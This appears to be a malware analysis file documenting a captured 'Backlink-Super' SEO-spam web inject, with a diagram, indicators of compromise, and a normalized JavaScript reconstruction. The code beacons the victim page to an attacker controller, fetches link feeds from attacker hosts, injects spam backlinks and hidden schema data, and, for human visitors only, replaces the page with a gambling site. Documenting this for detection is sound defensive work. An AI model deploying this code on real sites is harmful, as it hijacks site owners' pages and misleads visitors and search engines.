/*
 * Backlink-Super SEO hijacker
 *
 * Classification:
 *   compromise
 *   seo-spam
 *   backlink-injection
 *   cloaking
 *   web-inject
 *
 * Captured:
 *   2026-08-23
 *
 * Raw JavaScript:
 *   size:   1384585 bytes
 *   sha256: 7430eb4aab68446f1085e690ae11004148b989cdfcd39fea062aa7b03eb87c51
 *
 * Internal identity:
 *
 *   [Backlink-Super]
 *   Backlink Super Network
 *
 *
 * Compromised page
 *     |
 *     +-> Backlink-Super engine
 *     |     |
 *     |     +-> anaytics.pages.dev/all-backlink.txt
 *     |     +-> anaytics.pages.dev/template.txt
 *     |     |
 *     |     +-> external backlinks
 *     |     +-> internal backlinks
 *     |     +-> JSON-LD ItemList
 *     |     +-> hidden Schema.org ItemList
 *     |     +-> og:see_also
 *     |     +-> sitemap discovery
 *     |
 *     +-> human visitor
 *           |
 *           +-> logger.akses.best
 *                 |
 *                 +-> ?domain=<hostname + pathname>
 *                 |
 *                 +-> status != "rusak"
 *                 |     -> leave page in place
 *                 |
 *                 +-> status == "rusak"
 *                       |
 *                       +-> window.stop()
 *                       +-> replace canonical
 *                       +-> add malicious amphtml
 *                       +-> replace complete document
 *                       |
 *                       +-> Indonesian gaming SEO page
 *                             |
 *                             +-> link-vip1.pages.dev
 *                             +-> link-vip2.pages.dev
 *                             +-> link-vip3.pages.dev
 *
 *
 * Remote infrastructure:
 *
 *   logger.akses.best
 *       visitor/path controller
 *
 *   anaytics.pages.dev/all-backlink.txt
 *       external backlink feed
 *
 *   anaytics.pages.dev/template.txt
 *       anchor/template feed
 *
 *   izin-tampil-om-cr9.pages.dev
 *       generated AMP destination
 *
 *   link-vip1.pages.dev
 *   link-vip2.pages.dev
 *   link-vip3.pages.dev
 *       replacement-page CTA destinations
 *
 *   iamges-id.pages.dev
 *       replacement-page assets
 *
 *   timuna.net
 *       fallback backlink target
 *
 *
 * Backlink configuration:
 *
 *   external links: 2
 *   internal links: 2
 *   cache:          72 hours
 *
 *   rel:
 *       dofollow    30%
 *       nofollow    30%
 *       ugc         20%
 *       sponsored   20%
 *
 *   anchors:
 *       exact       15%
 *       brand       25%
 *       generic     40%
 *       naked       20%
 *
 *
 * Internal URL discovery:
 *
 *   /robots.txt
 *   /sitemap.xml
 *   /sitemap_index.xml
 *   /wp-sitemap.xml
 *   /wp-sitemap-posts-page-1.xml
 *   /timuna.xml
 *
 *
 * Browser state:
 *
 *   bk_super_v4_
 *   bk_shown_
 *   bk_page_views
 *   bk_etag
 *   bk_last_modified
 *
 *
 * Useful pivots:
 *
 *   Backlink Super Network
 *   [Backlink-Super]
 *   backlink_injected
 *   bk_super_v4_
 *   bk_shown_
 *   bk_page_views
 *   bk_etag
 *   bk_last_modified
 *   logger.akses.best
 *   anaytics.pages.dev
 *   all-backlink.txt
 *   template.txt
 *   izin-tampil-om-cr9.pages.dev
 *   "status":"rusak"
 *   G-XNDC0E18Z8
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const CONTROLLER =
        "https://logger.akses.best/";

    const BACKLINK_URLS =
        "https://anaytics.pages.dev/all-backlink.txt";

    const BACKLINK_TEMPLATES =
        "https://anaytics.pages.dev/template.txt";

    const AMP_ORIGIN =
        "https://izin-tampil-om-cr9.pages.dev";

    const FALLBACK_URLS = [
        "https://timuna.net"
    ];

    const FALLBACK_TEMPLATES = [
        "Info Lengkap",
        "Read More"
    ];

    const CTA_URLS = [
        "https://link-vip1.pages.dev/",
        "https://link-vip2.pages.dev/",
        "https://link-vip3.pages.dev/"
    ];

    const SITEMAP_PATHS = [
        "/robots.txt",
        "/sitemap.xml",
        "/sitemap_index.xml",
        "/wp-sitemap.xml",
        "/wp-sitemap-posts-page-1.xml",
        "/timuna.xml"
    ];

    const CACHE_HOURS = 72;

    const MAX_EXTERNAL_LINKS = 2;
    const INTERNAL_LINK_COUNT = 2;

    const STORAGE = {
        cachePrefix:
            "bk_super_v4_",

        shownPrefix:
            "bk_shown_",

        pageViews:
            "bk_page_views",

        etag:
            "bk_etag",

        lastModified:
            "bk_last_modified"
    };

    const REL_RATIOS = [
        ["",          0.30],
        ["nofollow",  0.30],
        ["ugc",       0.20],
        ["sponsored", 0.20]
    ];

    const ANCHOR_RATIOS = [
        ["exact",   0.15],
        ["brand",   0.25],
        ["generic", 0.40],
        ["naked",   0.20]
    ];

    const GENERIC_ANCHORS = [
        "Read More",
        "Visit Link",
        "Continue to Article",
        "Learn the Details",
        "See Article",
        "Go to Link",
        "Click This Link",
        "Full Details",
        "Get More Info",
        "Explore More"
    ];

    const PLACEMENTS = [
        {
            selector:
                "article > p",

            weight:
                3,

            position:
                "afterend"
        },

        {
            selector:
                ".post-content p",

            weight:
                2,

            position:
                "afterend"
        },

        {
            selector:
                "main p",

            weight:
                1,

            position:
                "beforeend"
        }
    ];


    /*
     * Human-only controller branch.
     */

    function isCrawler() {
        return (
            /bot|crawler|spider|robot|googlebot/i
                .test(
                    navigator.userAgent
                )
        );
    }


    function controllerUrl() {
        const victim =
            location.hostname +
            location.pathname;

        return (
            CONTROLLER +
            "?domain=" +
            encodeURIComponent(
                victim
            )
        );
    }


    async function getControllerState() {
        if (
            isCrawler()
        ) {
            return null;
        }

        try {
            const response =
                await fetch(
                    controllerUrl(),
                    {
                        cache:
                            "no-store"
                    }
                );

            return await response.json();
        } catch {
            return null;
        }
    }


    /*
     * status == "rusak"
     *
     * Replaces the victim page with the alternate SEO landing page.
     */

    function buildAmpUrl() {
        const hostname =
            location.hostname
                .replace(
                    /^www\./,
                    ""
                );

        const site =
            hostname
                .split(".")[0];

        return (
            AMP_ORIGIN +
            "/" +
            site +
            "/"
        );
    }


    function replaceLinkRel(
        rel,
        href
    ) {
        document
            .querySelectorAll(
                `link[rel="${rel}"]`
            )
            .forEach(
                element =>
                    element.remove()
            );

        const link =
            document.createElement(
                "link"
            );

        link.rel =
            rel;

        link.href =
            href;

        document.head
            .appendChild(
                link
            );
    }


    function replaceWithRusakLanding() {
        const canonical =
            location.href;

        const amp =
            buildAmpUrl();

        replaceLinkRel(
            "canonical",
            canonical
        );

        replaceLinkRel(
            "amphtml",
            amp
        );

        try {
            window.stop();
        } catch {
        }

        /*
         * Original contains a complete Indonesian gaming-themed
         * replacement page.
         *
         * The enormous embedded HTML/CSS is omitted here while preserving
         * the outbound campaign destinations.
         */

        document.documentElement.innerHTML = `
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Portal Hiburan Game Online Terbaik di Indonesia</title>
</head>
<body>
    <main>
        <a href="${CTA_URLS[0]}">Daftar</a>
        <a href="${CTA_URLS[1]}">Login</a>
        <a href="${CTA_URLS[2]}">Main Sekarang</a>
    </main>

    <script async
        src="https://www.googletagmanager.com/gtag/js?id=G-XNDC0E18Z8">
    <\/script>
</body>
</html>`;
    }


    async function runController() {
        const state =
            await getControllerState();

        if (
            state &&
            state.status === "rusak"
        ) {
            replaceWithRusakLanding();

            return true;
        }

        return false;
    }


    /*
     * Backlink-Super cache.
     */

    function cacheKey(
        name
    ) {
        return (
            STORAGE.cachePrefix +
            name
        );
    }


    function readCache(
        name
    ) {
        try {
            const raw =
                localStorage.getItem(
                    cacheKey(name)
                );

            if (!raw) {
                return null;
            }

            const cached =
                JSON.parse(raw);

            if (
                !cached ||
                !cached.t ||
                !cached.payload
            ) {
                return null;
            }

            const age =
                Date.now() -
                cached.t;

            if (
                age >
                CACHE_HOURS *
                60 *
                60 *
                1000
            ) {
                return null;
            }

            return cached.payload;
        } catch {
            return null;
        }
    }


    function writeCache(
        name,
        payload
    ) {
        try {
            localStorage.setItem(
                cacheKey(name),
                JSON.stringify({
                    t:
                        Date.now(),

                    payload
                })
            );
        } catch {
        }
    }


    /*
     * ETag / Last-Modified invalidation.
     */

    async function checkRemoteVersion() {
        try {
            const response =
                await fetch(
                    BACKLINK_URLS,
                    {
                        method:
                            "HEAD",

                        cache:
                            "no-store"
                    }
                );

            const etag =
                response.headers
                    .get(
                        "ETag"
                    );

            const modified =
                response.headers
                    .get(
                        "Last-Modified"
                    );

            const oldEtag =
                localStorage.getItem(
                    STORAGE.etag
                );

            const oldModified =
                localStorage.getItem(
                    STORAGE.lastModified
                );

            if (
                (
                    etag &&
                    oldEtag &&
                    etag !== oldEtag
                ) ||
                (
                    modified &&
                    oldModified &&
                    modified !== oldModified
                )
            ) {
                Object
                    .keys(
                        localStorage
                    )
                    .filter(
                        key =>
                            key.startsWith(
                                STORAGE.cachePrefix
                            )
                    )
                    .forEach(
                        key =>
                            localStorage
                                .removeItem(
                                    key
                                )
                    );
            }

            if (
                etag
            ) {
                localStorage.setItem(
                    STORAGE.etag,
                    etag
                );
            }

            if (
                modified
            ) {
                localStorage.setItem(
                    STORAGE.lastModified,
                    modified
                );
            }
        } catch {
        }
    }


    async function fetchList(
        name,
        url,
        fallback
    ) {
        const cached =
            readCache(
                name
            );

        if (
            cached
        ) {
            return cached;
        }

        try {
            const response =
                await fetch(
                    url
                );

            const text =
                await response.text();

            const values =
                text
                    .split(/\r?\n/)
                    .map(
                        value =>
                            value.trim()
                    )
                    .filter(Boolean);

            if (
                values.length
            ) {
                writeCache(
                    name,
                    values
                );

                return values;
            }
        } catch {
        }

        return fallback;
    }


    /*
     * Internal-link discovery.
     */

    function extractUrls(
        text
    ) {
        const matches =
            text.match(
                /https?:\/\/[^\s"'<>]+/gi
            ) || [];

        return matches.filter(
            value => {
                try {
                    return (
                        new URL(value)
                            .hostname ===
                        location.hostname
                    );
                } catch {
                    return false;
                }
            }
        );
    }


    async function discoverInternalUrls() {
        const found =
            new Set();

        for (
            const path
            of SITEMAP_PATHS
        ) {
            try {
                const response =
                    await fetch(
                        path
                    );

                const text =
                    await response.text();

                extractUrls(
                    text
                ).forEach(
                    url =>
                        found.add(url)
                );
            } catch {
            }
        }

        document
            .querySelectorAll(
                "a[href]"
            )
            .forEach(
                anchor => {
                    try {
                        const url =
                            new URL(
                                anchor.href,
                                location.href
                            );

                        if (
                            url.hostname ===
                            location.hostname
                        ) {
                            found.add(
                                url.href
                            );
                        }
                    } catch {
                    }
                }
            );

        return [
            ...found
        ];
    }


    /*
     * Maintain per-page popularity used by the internal-link selector.
     */

    function recordPageView() {
        let views = {};

        try {
            views =
                JSON.parse(
                    localStorage.getItem(
                        STORAGE.pageViews
                    ) ||
                    "{}"
                );
        } catch {
        }

        const page =
            location.pathname;

        views[page] =
            (
                views[page] ||
                0
            ) +
            1;

        try {
            localStorage.setItem(
                STORAGE.pageViews,
                JSON.stringify(
                    views
                )
            );
        } catch {
        }
    }


    /*
     * Backlink rendering.
     */

    function randomItem(
        values
    ) {
        return values[
            Math.floor(
                Math.random() *
                values.length
            )
        ];
    }


    function weightedChoice(
        values
    ) {
        const value =
            Math.random();

        let total = 0;

        for (
            const [
                item,
                weight
            ]
            of values
        ) {
            total +=
                weight;

            if (
                value <= total
            ) {
                return item;
            }
        }

        return values[0][0];
    }


    function hostnameBrand(
        url
    ) {
        try {
            return new URL(url)
                .hostname
                .replace(
                    /^www\./,
                    ""
                )
                .split(".")[0];
        } catch {
            return url;
        }
    }


    function buildAnchor(
        url,
        templates
    ) {
        const type =
            weightedChoice(
                ANCHOR_RATIOS
            );

        switch (
            type
        ) {
            case "naked":
                return url;

            case "brand":
                return hostnameBrand(
                    url
                );

            case "exact":
                return (
                    randomItem(
                        templates
                    ) ||
                    hostnameBrand(
                        url
                    )
                );

            default:
                return randomItem(
                    GENERIC_ANCHORS
                );
        }
    }


    function buildBacklink(
        url,
        templates
    ) {
        const wrapper =
            document.createElement(
                "div"
            );

        wrapper.className =
            "bk-super";

        wrapper.style.cssText =
            "font-size:13px;" +
            "line-height:1.6;" +
            "margin:1em 0;" +
            "opacity:.95";

        const anchor =
            document.createElement(
                "a"
            );

        anchor.href =
            url;

        anchor.textContent =
            buildAnchor(
                url,
                templates
            );

        const rel =
            weightedChoice(
                REL_RATIOS
            );

        if (
            rel
        ) {
            anchor.rel =
                rel;
        }

        anchor.target =
            "_blank";

        anchor.style.cssText =
            "color:#1a0dab;" +
            "text-decoration:none;" +
            "border-bottom:1px dotted #0066cc;" +
            "padding-bottom:1px";

        wrapper.appendChild(
            anchor
        );

        return wrapper;
    }


    function injectBacklink(
        node
    ) {
        const candidates = [];

        for (
            const placement
            of PLACEMENTS
        ) {
            document
                .querySelectorAll(
                    placement.selector
                )
                .forEach(
                    element => {
                        for (
                            let i = 0;
                            i < placement.weight;
                            i++
                        ) {
                            candidates.push({
                                element,
                                position:
                                    placement.position
                            });
                        }
                    }
                );
        }

        if (
            !candidates.length
        ) {
            document.body
                .appendChild(
                    node
                );

            return;
        }

        const selected =
            randomItem(
                candidates
            );

        selected.element
            .insertAdjacentElement(
                selected.position,
                node
            );
    }


    /*
     * Search-engine metadata augmentation.
     */

    function addSeeAlso(
        url
    ) {
        const meta =
            document.createElement(
                "meta"
            );

        meta.setAttribute(
            "property",
            "og:see_also"
        );

        meta.content =
            url;

        document.head
            .appendChild(
                meta
            );
    }


    function addItemListSchema(
        urls
    ) {
        const jsonLd =
            document.createElement(
                "script"
            );

        jsonLd.type =
            "application/ld+json";

        jsonLd.textContent =
            JSON.stringify({
                "@context":
                    "https://schema.org",

                "@type":
                    "ItemList",

                name:
                    "Backlink Super Network",

                itemListElement:
                    urls.map(
                        (
                            url,
                            index
                        ) => ({
                            "@type":
                                "ListItem",

                            position:
                                index + 1,

                            item: {
                                "@type":
                                    "WebPage",

                                url
                            }
                        })
                    )
            });

        document.head
            .appendChild(
                jsonLd
            );


        const hidden =
            document.createElement(
                "div"
            );

        hidden.style.display =
            "none";

        hidden.setAttribute(
            "itemscope",
            ""
        );

        hidden.setAttribute(
            "itemtype",
            "https://schema.org/ItemList"
        );

        const name =
            document.createElement(
                "meta"
            );

        name.setAttribute(
            "itemprop",
            "name"
        );

        name.content =
            "Backlink Super Network";

        hidden.appendChild(
            name
        );

        document.body
            .appendChild(
                hidden
            );
    }


    async function runBacklinkSuper() {
        recordPageView();

        await checkRemoteVersion();

        const externalUrls =
            await fetchList(
                "urls",
                BACKLINK_URLS,
                FALLBACK_URLS
            );

        const templates =
            await fetchList(
                "templates",
                BACKLINK_TEMPLATES,
                FALLBACK_TEMPLATES
            );

        const internalUrls =
            await discoverInternalUrls();

        const selectedExternal =
            externalUrls
                .slice()
                .sort(
                    () =>
                        Math.random() -
                        0.5
                )
                .slice(
                    0,
                    MAX_EXTERNAL_LINKS
                );

        const selectedInternal =
            internalUrls
                .filter(
                    url =>
                        url !==
                        location.href
                )
                .slice()
                .sort(
                    () =>
                        Math.random() -
                        0.5
                )
                .slice(
                    0,
                    INTERNAL_LINK_COUNT
                );

        for (
            const url
            of [
                ...selectedExternal,
                ...selectedInternal
            ]
        ) {
            injectBacklink(
                buildBacklink(
                    url,
                    templates
                )
            );
        }

        for (
            const url
            of selectedExternal
        ) {
            addSeeAlso(
                url
            );
        }

        addItemListSchema(
            selectedExternal
        );

        document.documentElement
            .setAttribute(
                "data-backlink-injected",
                "true"
            );
    }


    /*
     * Recovered high-level execution:
     *
     *   runBacklinkSuper()
     *   runController()
     *
     * Left uninvoked in this normalized reconstruction.
     */

    void runBacklinkSuper;
    void runController;
})();


/*
 * Replacement-page indicators
 *
 *   https://izin-tampil-om-cr9.pages.dev/<site>/
 *
 *   https://link-vip1.pages.dev/
 *   https://link-vip2.pages.dev/
 *   https://link-vip3.pages.dev/
 *
 *   https://iamges-id.pages.dev/payment.png
 *
 *   https://ik.imagekit.io/yrxfrenw3/logo-sa2.gif
 *   https://ik.imagekit.io/yrxfrenw3/kiwkiw.png
 *
 *   G-XNDC0E18Z8
 *
 *
 * Backlink feeds
 *
 *   https://anaytics.pages.dev/all-backlink.txt
 *   https://anaytics.pages.dev/template.txt
 *
 *
 * Controller
 *
 *   https://logger.akses.best/?domain=<victim>
 *
 *   {
 *       "status": "rusak"
 *   }
 */
